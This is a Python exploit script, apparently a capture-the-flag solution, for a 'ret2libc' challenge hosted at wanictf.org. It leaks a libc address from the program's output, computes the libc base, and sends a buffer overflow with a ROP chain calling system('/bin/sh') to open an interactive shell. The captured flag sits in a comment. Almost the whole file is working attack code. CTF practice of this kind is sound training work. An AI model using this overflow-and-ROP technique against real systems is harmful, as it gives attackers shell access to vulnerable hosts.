#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'ret2libc-pwn.wanictf.org', 'port':9007})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
'''
addr_plt_puts       = binf.plt['puts']
addr_got_main       = binf.got['__libc_start_main']
addr_bss            = binf.sep_section['.bss']
addr_main           = binf.sep_function['main']
'''

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']
'''
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10
'''

#==========

def attack(conn, **kwargs):
    conn.recvuntil(b'+0x28 | ')
    addr_libc_main = int(conn.recvuntil(b' | ', drop=True), 16) + 0x30

    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    rop = ROP(libc)
    rop.call(rop.ret.address)
    rop.system(addr_libc_str_sh)

    conn.sendlineafter(b'> ', (b'a'*0x28 + bytes(rop)).ljust(0x80))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # FLAG{c0n6r475_0n_6r4du471n6_45_4_9wn_b361nn3r!}

if __name__=='__main__':
    main()

#==========
